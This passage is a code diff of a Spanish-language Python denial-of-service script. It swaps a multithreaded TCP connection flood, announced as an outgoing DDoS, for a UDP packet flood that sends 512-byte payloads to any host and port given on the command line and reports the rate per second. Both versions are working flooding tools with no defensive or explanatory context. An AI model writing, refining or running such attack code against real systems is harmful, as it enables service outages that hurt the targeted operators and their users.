@@ -1,52 +1,39 @@
 import argparse
 import socket
-import threading
 import time
-
-
-def inundar(destino, puerto, duracion, contador, bloqueo):
-    fin = time.time() + duracion
-    while time.time() < fin:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setblocking(False)
-            try:
-                s.connect((destino, puerto))
-            except BlockingIOError:
-                pass
-            except OSError:
-                pass
-            s.close()
-            with bloqueo:
-                contador[0] += 1
-        except Exception:
-            pass
 
 
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--destino", required=True)
     parser.add_argument("--puerto", type=int, required=True)
-    parser.add_argument("--hilos", type=int, default=50)
     parser.add_argument("--duracion", type=int, default=20)
     args = parser.parse_args()
 
-    print(f"Lanzando DDoS saliente hacia {args.destino}:{args.puerto}")
-    print(f"Hilos: {args.hilos} | Duracion: {args.duracion}s")
+    print(f"Lanzando UDP flood hacia {args.destino}:{args.puerto}")
 
-    contador = [0]
-    bloqueo = threading.Lock()
-    hilos = []
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = b"A" * 512
 
-    for _ in range(args.hilos):
-        h = threading.Thread(target=inundar, args=(args.destino, args.puerto, args.duracion, contador, bloqueo))
-        h.start()
-        hilos.append(h)
+    fin = time.time() + args.duracion
+    contador = 0
+    ultimo_reporte = time.time()
+    ultimo_contador = 0
 
-    for h in hilos:
-        h.join()
+    while time.time() < fin:
+        try:
+            s.sendto(payload, (args.destino, args.puerto))
+            contador += 1
+        except Exception:
+            pass
 
-    print(f"Ataque finalizado. Conexiones intentadas: {contador[0]}")
+        ahora = time.time()
+        if ahora - ultimo_reporte >= 1.0:
+            print(f"Tasa actual: {contador - ultimo_contador} paquetes/segundo")
+            ultimo_reporte = ahora
+            ultimo_contador = contador
+
+    print(f"Ataque finalizado. Paquetes enviados: {contador}")
 
 
 if __name__ == "__main__":
